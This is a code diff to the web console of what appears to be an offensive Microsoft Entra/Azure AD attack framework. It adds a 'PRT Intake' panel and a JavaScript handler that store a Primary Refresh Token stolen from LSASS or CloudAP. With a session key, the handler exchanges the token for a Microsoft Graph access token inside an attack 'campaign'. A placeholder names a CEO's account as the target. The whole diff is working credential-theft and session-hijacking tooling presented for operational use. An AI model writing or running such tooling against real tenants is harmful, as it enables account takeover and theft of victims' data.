@@ -271,6 +271,7 @@
         <div class="section-tabs">
           <button class="section-tab active" onclick="prtTab(this,'request')">Request PRT</button>
           <button class="section-tab" onclick="prtTab(this,'import')">Import PRT</button>
+          <button class="section-tab" onclick="prtTab(this,'intake')">PRT Intake</button>
           <button class="section-tab" onclick="prtTab(this,'list')">Stored PRTs</button>
           <button class="section-tab" onclick="prtTab(this,'use')">Use PRT</button>
         </div>
@@ -299,6 +300,24 @@
           <div class="input-group"><label>DEVICE CERT ID (optional)</label><select id="prtIDevCert"><option value="">— none —</option></select></div>
           <button class="btn btn-warn" onclick="importPRT()">▶ Import PRT</button>
           <div class="output" id="prtIOutput" style="margin-top:12px"></div>
+        </div>
+
+        <div id="prttab-intake" class="section-body">
+          <p style="font-size:11px;color:var(--text-dim);margin-bottom:14px">Drop a captured PRT (LSASS / CloudAP) into the vault and optionally <b>activate it in a campaign</b>: with a session key and a selected campaign, the PRT is exchanged for a Graph access token and ingested into that campaign, ready for Graph Actions. Same effect as <code>POST :port/token</code> with a PRT payload — the standalone listener does not need to be running for this console drop.</p>
+          <div class="input-group"><label>LABEL</label><input id="prtNLabel" type="text" placeholder="ceo@contoso.com PRT (LSASS)"></div>
+          <div class="input-group"><label>PRT TOKEN</label><textarea id="prtNToken" rows="3" placeholder="Paste the PRT"></textarea></div>
+          <div class="input-group"><label>SESSION KEY (base64)</label><input id="prtNSessionKey" type="text" placeholder="derived/clear key — required to mint tokens"></div>
+          <div class="input-row">
+            <div class="input-group"><label>TARGET UPN</label><input id="prtNUPN" type="text" placeholder="user@contoso.com"></div>
+            <div class="input-group"><label>TENANT ID</label><input id="prtNTenantId" type="text"></div>
+          </div>
+          <div class="input-group"><label>DEVICE CERT ID (optional)</label><select id="prtNDevCert"><option value="">— none —</option></select></div>
+          <div class="input-group">
+            <label><input type="checkbox" id="prtNActivate" onchange="document.getElementById('prtNCampaignRow').style.display=this.checked?'block':'none'"> Activate in campaign (auto-exchange PRT → Graph token → ingest)</label>
+          </div>
+          <div id="prtNCampaignRow" class="input-group" style="display:none"><label>CAMPAIGN</label><select id="prtNCampaign"><option value="">— select campaign —</option></select></div>
+          <button class="btn btn-primary" onclick="ingestPRTPanel()">▶ Ingest PRT</button>
+          <div class="output" id="prtNOutput" style="margin-top:12px"></div>
         </div>
 
         <div id="prttab-list" class="section-body">
@@ -771,7 +790,7 @@ async function bootApp() {
 async function loadCampaignsForSelects() {
   const data = await api('GET', '/campaigns');
   const campaigns = data.campaigns || data || [];
-  const selectors = ['exCampaignId', 'mfaCampaignId', 'gaCampaignId'];
+  const selectors = ['exCampaignId', 'mfaCampaignId', 'gaCampaignId', 'prtNCampaign'];
   selectors.forEach(id => {
     const sel = document.getElementById(id);
     if (!sel) return;
@@ -986,7 +1005,7 @@ async function gaAssignDirectoryRole() {
 async function loadDeviceCertsForSelects() {
   const data = await api('GET', '/device-certs');
   const certs = Array.isArray(data) ? data : [];
-  ['prtDevCert','prtIDevCert','whDevCert'].forEach(id => {
+  ['prtDevCert','prtIDevCert','prtNDevCert','whDevCert'].forEach(id => {
     const sel = document.getElementById(id);
     if (!sel) return;
     sel.innerHTML = '<option value="">— none —</option>' +
@@ -1154,6 +1173,40 @@ async function importPRT() {
     deviceCertId: document.getElementById('prtIDevCert').value,
   });
   out.textContent = result.error ? '⚠ '+result.error : '✓ Imported: '+result.id;
+}
+
+async function ingestPRTPanel() {
+  const out = document.getElementById('prtNOutput');
+  const prt = document.getElementById('prtNToken').value.trim();
+  if (!prt) { out.textContent = '⚠ PRT token required'; return; }
+  const activate = document.getElementById('prtNActivate').checked;
+  const campaignId = activate ? document.getElementById('prtNCampaign').value : '';
+  const sessionKey = document.getElementById('prtNSessionKey').value.trim();
+  if (activate && !campaignId) { out.textContent = '⚠ Select a campaign to activate in'; return; }
+  if (activate && !sessionKey) { out.textContent = '⚠ Session key required to exchange the PRT'; return; }
+  out.textContent = '⏳ Ingesting PRT...';
+  const result = await api('POST', '/prts/ingest', {
+    prt: prt,
+    session_key: sessionKey,
+    upn: document.getElementById('prtNUPN').value.trim(),
+    tenant_id: document.getElementById('prtNTenantId').value.trim(),
+    device_cert_id: document.getElementById('prtNDevCert').value,
+    label: document.getElementById('prtNLabel').value.trim(),
+    campaign_id: campaignId,
+    source: 'console-drop',
+  });
+  if (result.error) { out.textContent = '⚠ '+result.error; return; }
+  let msg = '✓ PRT stored — id: '+result.prt_id;
+  if (result.exchanged) {
+    msg += '\n✓ Exchanged to Graph token and ingested into campaign '+result.campaign_id+
+           '\n  target: '+(result.target_email||result.target_id)+' — now usable in Graph Actions';
+  } else if (result.exchange_error) {
+    msg += '\n⚠ Auto-exchange failed (PRT still stored): '+result.exchange_error;
+  } else if (activate) {
+    msg += '\n⚠ Not exchanged (need session key + campaign)';
+  }
+  out.textContent = msg;
+  loadPRTs();
 }
 
 async function loadPRTs() {
